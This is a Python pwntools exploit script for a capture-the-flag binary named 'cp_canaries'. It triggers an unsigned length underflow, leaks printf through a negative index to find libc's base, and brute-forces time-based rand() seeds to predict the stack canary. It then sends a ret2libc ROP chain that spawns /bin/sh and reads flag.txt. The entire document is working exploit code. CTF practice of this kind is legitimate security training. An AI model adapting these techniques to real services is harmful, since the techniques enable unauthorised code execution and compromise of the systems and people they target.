#!/usr/bin/env python3
from pwn import *

import argparse
import ctypes
import time


context.terminal = ["tmux", "splitw", "-h"]


def parse_args():
    parser = argparse.ArgumentParser(description="Exploit for canaries challenge")
    parser.add_argument("--binary", default="./cp_canaries", help="Target binary path")
    parser.add_argument("--libc", default="./libc.so.6", help="Libc used for offsets/rand")
    parser.add_argument("--host", help="Remote host")
    parser.add_argument("--port", type=int, help="Remote port")
    parser.add_argument("--seed", type=int, help="Base timestamp seed to start from")
    parser.add_argument("--window", type=int, default=8, help="Bruteforce window around base seed")
    parser.add_argument("--log-level", default="info", help="pwntools log level")
    parser.add_argument("--interactive", action="store_true", help="Drop to interactive on success")
    return parser.parse_args()


def seed_candidates(center, window):
    yield center
    for delta in range(1, window + 1):
        yield center - delta
        yield center + delta


def start_proc(args, elf):
    if args.host and args.port:
        return remote(args.host, args.port)
    return process(elf.path)


def choose(io, option):
    io.sendlineafter(b"2) print canary stats", str(option).encode())


def prime_underflow(io):
    # 1) length: 16 -> 0 (send one byte: '\n')
    choose(io, 0)
    io.sendlineafter(b"what will his name be?\n", b"")

    # 2) length: 0 -> 65535 (read(..., 0) returns 0, then unsigned decrement)
    choose(io, 0)
    io.recvuntil(b"size: 65535")


def leak_printf(io):
    choose(io, 2)
    io.sendlineafter(b"select canary index (0-3):\n", b"-3")
    io.recvuntil(b"weight: ")
    return int(io.recvline().strip())


def predict_canary0(rand_lib, seed):
    # __init_canary_stub consumes 2x rand() for canary index 0
    rand_lib.srand(seed)
    hi = rand_lib.rand() & 0xFFFFFFFF
    lo = rand_lib.rand() & 0xFFFFFFFF
    canary = ((hi << 32) | lo) & 0xFFFFFFFFFFFFFFFF
    if canary == 0:
        canary = 0xA55AA55AA55AA55A
    return canary


def build_payload(libc, canary0):
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    ret = rop.find_gadget(["ret"]).address
    bin_sh = next(libc.search(b"/bin/sh\x00"))

    payload = flat(
        b"A" * 0x10,
        canary0,
        0,  # index for __var_canary_table[0]
        b"B" * 0x10,
        0x4242424242424242,
        ret,
        pop_rdi,
        bin_sh,
        libc.sym.system,
    )

    # Program forces payload[len(payload)-1] = 0, keep a sacrificial byte.
    payload += b"Z"
    return payload


def try_seed(args, elf, libc, rand_lib, seed):
    io = start_proc(args, elf)
    try:
        prime_underflow(io)

        printf_leak = leak_printf(io)
        libc.address = printf_leak - libc.sym.printf

        canary0 = predict_canary0(rand_lib, seed)
        log.info(f"seed={seed} printf={hex(printf_leak)} libc={hex(libc.address)} canary0={hex(canary0)}")

        choose(io, 0)
        io.sendafter(b"what will his name be?\n", build_payload(libc, canary0))

        # If canary is right, option 0 continues and prints size.
        io.recvuntil(b"size: ", timeout=1)

        # Make scanf fail so main returns into our ROP chain.
        io.sendline(b"x")

        io.sendline(b"echo __PWNED__")
        out = io.recvrepeat(0.7)

        if b"__PWNED__" not in out:
            raise EOFError("no shell marker")

        log.success(f"worked with seed={seed}")
        io.sendline(b"cat flag.txt")
        flag_out = io.recvrepeat(0.8)
        if flag_out:
            log.success(flag_out.decode(errors="ignore").strip())

        io.interactive()
        return True

    except (EOFError, PwnlibException):
        io.close()
        return False


def main():
    args = parse_args()
    context.log_level = args.log_level

    elf = context.binary = ELF(args.binary, checksec=False)
    libc = ELF(args.libc, checksec=False)

    rand_lib = ctypes.CDLL(args.libc)
    rand_lib.srand.argtypes = [ctypes.c_uint]
    rand_lib.srand.restype = None
    rand_lib.rand.argtypes = []
    rand_lib.rand.restype = ctypes.c_int

    base_seed = args.seed if args.seed is not None else int(time.time())
    log.info(f"starting brute force around seed={base_seed} window=+/-{args.window}")

    for seed in seed_candidates(base_seed, args.window):
        if try_seed(args, elf, libc, rand_lib, seed):
            return

    log.failure("no working seed found; increase --window or set --seed closer to target")


if __name__ == "__main__":
    main()
